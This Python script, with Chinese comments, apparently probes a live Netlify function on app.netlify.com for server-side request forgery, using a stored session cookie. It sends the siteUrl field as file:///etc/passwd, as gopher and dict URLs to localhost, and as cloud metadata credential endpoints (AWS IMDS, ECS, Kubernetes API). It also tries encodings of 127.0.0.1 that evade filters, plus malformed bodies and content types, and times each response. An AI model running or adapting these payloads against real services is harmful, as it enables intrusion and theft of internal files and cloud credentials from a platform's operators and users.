# -*- coding: utf-8 -*-
"""sdk-version URL/body 变异:scheme、IP 编码、时序矩阵(匿名)"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_B

ctx = ssl.create_default_context()

def req(body, ctype='application/json', cookie=COOKIE_B, timeout=45):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': ctype}
    if cookie:
        h['Cookie'] = cookie
    payload = body if isinstance(body, bytes) else json.dumps(body).encode()
    t0 = time.time()
    try:
        conn.request('POST', '/.netlify/functions/fetch-extension-host-site-sdk-version', body=payload, headers=h)
        r = conn.getresponse()
        raw = r.read()
        enc = r.getheader('Content-Encoding')
        if enc == 'br':
            raw = brotli.decompress(raw)
        elif enc == 'gzip':
            raw = gzip.decompress(raw)
        st = r.status
        dt = time.time() - t0
        conn.close()
        return st, dt, raw
    except Exception as e:
        return 'ERR', time.time() - t0, str(e)[:60].encode()

# G1. URL scheme 变体
urls = [
    ('file',        'file:///etc/passwd'),
    ('gopher',      'gopher://127.0.0.1:79/_x'),
    ('ftp',         'ftp://127.0.0.1:21/'),
    ('dict',        'dict://127.0.0.1:11211/'),
    ('http-auth',   'http://user:pass@127.0.0.1:80/'),
    ('https-443',   'https://127.0.0.1:443/'),
    ('http-80',     'http://127.0.0.1:80/'),
    ('http-8080',   'http://127.0.0.1:8080/'),
    ('imds-v2',     'http://169.254.169.254/latest/meta-data/iam/security-credentials/'),
    ('imds-100',    'http://169.254.100.5/'),
    ('ecs-creds',   'http://169.254.170.2/creds'),
    ('k8s-api',     'http://10.96.0.1:443/'),
    ('neon-gw',     'http://169.254.254.254/'),
]
print('--- scheme / 特殊地址时序 ---')
for label, u in urls:
    st, dt, raw = req({'siteUrl': u})
    print('%-14s %s %6.1fs %s' % (label, st, dt, raw[:100].decode('utf-8', 'replace').replace('\n', ' ')))

# G2. IP 编码变体(全部应指向 127.0.0.1)
ips = [
    ('dec',       'http://2130706433:80/'),
    ('hex',       'http://0x7f000001:80/'),
    ('oct',       'http://0177.0.0.1:80/'),
    ('v6-loop',   'http://[::1]:80/'),
    ('v6-mapped', 'http://[::ffff:127.0.0.1]:80/'),
    ('short1',    'http://127.1:80/'),
    ('short2',    'http://127.0.1:80/'),
    ('trailing.', 'http://127.0.0.1.:80/'),
]
print('--- 127.0.0.1 编码变体 ---')
for label, u in ips:
    st, dt, raw = req({'siteUrl': u})
    print('%-12s %s %6.1fs %s' % (label, st, dt, raw[:100].decode('utf-8', 'replace').replace('\n', ' ')))

# G3. body 结构变体
bodies = [
    ('missing url',     {}),
    ('url null',        {'siteUrl': None}),
    ('url empty',       {'siteUrl': ''}),
    ('url array',       {'siteUrl': ['https://example.com']}),
    ('url obj',         {'siteUrl': {'u': 'https://example.com'}}),
    ('url num',         {'siteUrl': 123}),
    ('extra fields',    {'siteUrl': 'https://example.com', 'x': 1, 'teamId': 't'}),
    ('dup siteUrl',     {'siteUrl': 'https://example.com', 'siteUrl2': 'http://10.0.0.1:80/'}),
]
print('--- body 结构变体 ---')
for label, b in bodies:
    st, dt, raw = req(b)
    print('%-16s %s %6.1fs %s' % (label, st, dt, raw[:150].decode('utf-8', 'replace').replace('\n', ' ')))

# G4. content-type 变体
print('--- content-type ---')
for label, ct, payload in [
    ('form',      'application/x-www-form-urlencoded', b'siteUrl=https%3A%2F%2Fexample.com'),
    ('raw json',  'text/plain', b'{"siteUrl":"https://example.com"}'),
    ('multipart', 'multipart/form-data; boundary=x', b'--x\r\nContent-Disposition: form-data; name="siteUrl"\r\n\r\nhttps://example.com\r\n--x--\r\n'),
]:
    st, dt, raw = req(payload, ct)
    print('%-12s %s %6.1fs %s' % (label, st, dt, raw[:150].decode('utf-8', 'replace').replace('\n', ' ')))
